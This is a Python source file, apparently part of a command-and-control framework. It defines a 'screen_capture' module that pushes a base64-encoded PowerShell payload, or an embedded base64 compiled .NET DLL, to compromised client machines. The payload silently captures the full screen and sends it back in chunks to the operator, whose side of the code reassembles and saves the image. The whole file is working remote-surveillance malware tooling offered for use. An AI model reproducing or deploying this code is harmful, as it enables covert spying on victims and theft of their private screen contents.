import base64
import shlex
import subprocess
import time

from prompt_toolkit import prompt
from prompt_toolkit.shortcuts import ProgressBar

from modules.base import BaseModule, ClientModuleNotLoaded


class Module(BaseModule):
    MODULE_NAME = 'screen_capture'

    CLIENT_TYPE_POWERSHELL = 0
    CLIENT_TYPE_CSHARP = 1

    def __init__(self):
        self.running = False

    @staticmethod
    def get_commands() -> [[str]]:
        return [
            ['screen_capture', '<client>', 'Takes a screenshot in the selected client']
        ]

    def get_client_code(self, client_type):
        if client_type == self.CLIENT_TYPE_POWERSHELL:
            return base64.b64encode('''
                try{
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-type -AssemblyName System.Drawing
                    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                    $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                    [System.Drawing.Graphics]::FromImage($bitmap).CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
                    $stream = New-Object System.IO.MemoryStream
                    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                    $ib64 = [convert]::ToBase64String($stream.ToArray())
                    $partSize = 32000
                    $total = $ib64.Length
                    $parts = [Math]::Floor($total / $partSize)
                    for ($i=0; $i -le $parts; $i++) {
                        $start = $i * $partSize
                        if ($start -eq 0) {
                            $start = -1
                        }
                        $end = ($i + 1)* $partSize
                        $response = @{"service" = "screen_capture"; "content" = $ib64[($start+1)..$end] -join ''; "part" = $i; "of" = $parts;}
                        Send-Message -Msg $response -To $args[2]
                    }
                }catch{
                    Write-Log $PSItem.Exception.Message;
                    $response = @{"service" = "screen_capture"; "result" = $PSItem.Exception.Message; }
                    Send-Message -Msg $response -To $args[2]
                }
                return $null
            '''.encode()).decode()
        else:
            return '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kQCiAj0AwQCtAAYAyQDyAUcAqQDTAUwAgQA7BFQA2QAsAlkA4QBUAl8A4QA7AmMAaQA8AwYAaQBNABAAaQAHBBAAaQAZBAEAaQDrAQEAmQA8AwYAmQCxAhAAmQD1AhAAmQA3AGkA6QDhAW8AcQBIABAALgALAMsALgATANQALgAbAPMALgAjAPwALgArADIBLgAzAEgBLgA7AFUBLgBDAGIBLgBLADIBLgBTADIBFQBnAgABBwAqBAEAAAEJABQAAQAAAQsA2AMBAASAAAABAAAAAAAAAAAAAAAAAHoAAAAFAAAAAAAAAAAAAAB9AIsAAAAAAAEAAAAAAAAAAAAAAAAACAAAAAAAAQAAAAQAAAAAAAAAhgAWAwAAAAAFAAAAAAAAAAAAAACPAOQCAAAAAAUAAAAAAAAAAAAAAI8AzgIAAAAABQAAAAAAAAAAAAAAfQCNAwAAAAADAAIABAADAEUAeAAAAAAAAFVzZXIzMgBDMgA8TW9kdWxlPgBHZXRXaW5kb3dEQwBTeXN0ZW0uSU8AUkVDVABQYXlsb2FkAHNldF9wYXlsb2FkAGhXbmQAU2VuZABzZXRfc2VydmljZQBGcm9tSW1hZ2UASURpc3Bvc2FibGUAQmFzZU1vZHVsZQBTY3JlZW5zaG90TW9kdWxlAFN5c3RlbS5SdW50aW1lAFZhbHVlVHlwZQBSZXNwb25zZQBEaXNwb3NlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUluZm9ybWF0aW9uYWxWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARXhlY3V0ZQBTYXZlAHBhcnRTaXplAFNlcmlhbGl6ZQBzZXRfb2YAZ2V0X0pwZWcAU3lzdGVtLkRyYXdpbmcuSW1hZ2luZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRvQmFzZTY0U3RyaW5nAFN1YnN0cmluZwBTeXN0ZW0uRHJhd2luZwBnZXRfTGVuZ3RoAEMyLnV0aWwAdXNlcjMyLmRsbABTY3JlZW5zaG90TW9kdWxlLmRsbABNZW1vcnlTdHJlYW0AU3lzdGVtAGJvdHRvbQBDb3B5RnJvbVNjcmVlbgBzZXRfYWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFN5c3RlbS5EcmF3aW5nLkNvbW1vbgBTeXN0ZW0uVGV4dC5Kc29uAHNldF90bwBCaXRtYXAAdG9wAFdlYlNvY2tldFNoYXJwAHdlYnNvY2tldC1zaGFycABzZXJ2ZXIASnNvblNlcmlhbGl6ZXIALmN0b3IAR3JhcGhpY3MAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAU3lzdGVtLkRyYXdpbmcuUHJpbWl0aXZlcwBKU09OT3B0aW9ucwBKc29uU2VyaWFsaXplck9wdGlvbnMAd3MASW1hZ2VGb3JtYXQAR2V0V2luZG93UmVjdABPYmplY3QAcmVjdABXZWJTb2NrZXQAbGVmdAByaWdodABzZXRfY29udGVudABQb2ludABzZXRfcGFydABDb252ZXJ0AEdldERlc2t0b3BXaW5kb3cAVG9BcnJheQBFbXB0eQAAAAAAHXMAYwByAGUAZQBuAF8AYwBhAHAAdAB1AHIAZQAAD3MAZQBuAGQAbQBzAGcAAAVPAEsAAAAAAM2IXj4rb51Ks0+LqU1un4oABCABAQgDIAABBSABARERBCABAQ4WBw4REAgIEkEOCAgSRRJJCAgOEjUSTQUgAgEICAYAARJJElUDBhFZCSADARFZEVkRXQQAABJlByACARJpEmUEIAAdBQUAAQ4dBQMgAAgFIAIOCAgFIAEBEjUIEAECDh4AEj0ECgESTQiwP19/EdUKOghWYLCKGEWpHgjMexP/zS3dUQIGDgMGEjUDBhI5AwYSPQIGCAsgBQEODhI1EjkSPQMgAA4DAAAYBAABGBgHAAIYGBAREAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAA1AQAYLk5FVENvcmVBcHAs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'

    def run(self, command):

        command_parsed = shlex.split(command)
        if len(command_parsed) < 2:
            print('[-] Invalid arguments.')
            return
        client_id_or_name = command_parsed[1]
        if len(command_parsed) > 2:
            image_path = command.split(' ')[2]
        else:
            image_path = ''

        client_id = self.c2_manager.get_client_id_by_client_name(client_id_or_name)

        try:
            b64_image = ''
            self.c2_manager.master_connection.send_service(client_id, self.MODULE_NAME, {})
            recv_parts = 0
            msg_recv_order = {}

            with ProgressBar() as pb:

                progress_bar = None

                while True:

                    response = self.c2_manager.master_connection.recv_service_response(client_id, self.MODULE_NAME)

                    if response is None:
                        return

                    if 'error' in response and response['error'] == ClientModuleNotLoaded.CLIENT_ERROR_CODE_MODULE_NOT_FOUND and 'client_type' in response:
                        raise ClientModuleNotLoaded(client_id, self.MODULE_NAME, response['client_type'])

                    if int(response['part']) == 0:
                        progress_bar = pb(total=int(response['of']))
                    elif progress_bar is not None:
                        progress_bar.item_completed()

                    if recv_parts == int(response['part']):
                        # print('part: {} of {}'.format(str(response['part']), str(response['of'])))
                        b64_image += response['content']
                        recv_parts += 1
                        while recv_parts in msg_recv_order:
                            # print('part: {} of {}'.format(recv_parts, str(response['of'])))
                            b64_image += msg_recv_order[recv_parts]
                            del msg_recv_order[recv_parts]
                            recv_parts += 1
                    else:
                        msg_recv_order[int(response['part'])] = response['content']

                    if recv_parts > int(response['of']):
                        break
            if image_path == '':
                image_name = '{}_{}.jpg'.format(image_path, client_id_or_name, time.strftime("%Y-%m-%d_%H.%M.%S"))
            else:
                image_name = '{}/{}_{}.jpg'.format(image_path, client_id_or_name, time.strftime("%Y-%m-%d_%H.%M.%S"))
            with open(image_name, 'wb') as image_file:
                image_file.write(base64.b64decode(b64_image.encode()))

            print('[+] Image saved in {}'.format(image_name))

            user_input = prompt('[?] Do you want to open the image? Y/n')
            if user_input.lower() == 'y' or not user_input:
                subprocess.run(['open', image_name], check=True)

        except KeyboardInterrupt:
            print('\n[!] Are you sure you want to cancel the screen capture module? Y/n')
            resp = input().lower()
            if resp != 'y':
                self.run(command)
